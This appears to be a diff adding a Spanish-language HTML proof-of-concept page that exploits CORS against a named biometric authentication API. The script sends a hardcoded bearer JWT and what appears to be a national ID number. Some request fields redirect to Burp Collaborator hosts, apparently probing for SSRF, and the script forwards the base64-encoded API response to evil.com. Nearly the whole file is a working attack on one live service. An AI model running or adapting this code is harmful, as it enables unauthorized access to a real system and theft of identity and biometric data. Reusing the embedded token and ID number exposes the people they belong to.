@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC - Explotación CORS con Token JWT</title>
+</head>
+<body>
+    <h2>Explotación CORS con Token JWT</h2>
+    <button onclick="explotarCORS()">Ejecutar Exploit</button>
+
+    <script>
+        function explotarCORS() {
+            fetch("https://biometriasd.securitydata.net.ec/microservices-biometria/api/auth/autenticarSolicitud", {
+                method: "POST",
+                headers: {
+                    "User-Agent": "Rocket",
+                    "Content-Type": "application/json",
+                    "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJwcnVlYmEiLCJpYXQiOjE3Mzg1OTU4NzQsImV4cCI6MTczODYzMTg3NH0.lJ7d_n1OlerteVbyOp4BFOW6LyQzui5Bfpu9Y-g6nkY"
+                },
+                body: JSON.stringify({
+                    "documento": "0957436058",
+                    "urlNotificacion": "http://localhost:8080/api/secret?redirect=http://uvtxxcceyncfffltkr78en086zcq0ood.oastify.com/exfiltrar",
+                    "urlSalida": "https://v2yy4djf5ojgmgsurse9lo79d0jr7hv6.oastify.com",
+                    "urlImagen": "http://localhost/hola?redirect=http://uvtxxcceyncfffltkr78en086zcq0ood.oastify.com/exfiltrar",
+                    "imagenBase64": "XXXXXXXXXXXXXXXXXXXXX",
+                    "isBase64": false,
+                    "metaData": {"idTramite": 1234},
+                    "tipoBiometria": "TIPO_SERVICIO_BIOMETRIA"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Respuesta de la API:", data);
+                fetch("https://evil.com/robar?data=" + btoa(JSON.stringify(data)));  // Exfiltra datos a un servidor malicioso
+            })
+            .catch(err => console.error("Error:", err));
+        }
+    </script>
+</body>
+</html>
